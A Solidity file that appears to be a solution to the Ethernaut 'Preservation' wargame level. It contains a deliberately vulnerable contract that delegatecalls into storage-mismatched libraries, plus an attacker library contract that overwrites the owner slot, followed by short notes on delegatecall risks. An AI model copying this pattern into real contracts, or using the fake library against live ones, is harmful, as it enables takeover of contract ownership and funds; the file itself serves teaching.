// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint public storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

// design storage layout to be able to overwrite Preservation's owner
contract LibraryContractFake {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
}


// SOLUTION NOTES
// As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. 
// This is particularly true for contract libraries that have their own state. This example demonstrates why the 
// library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
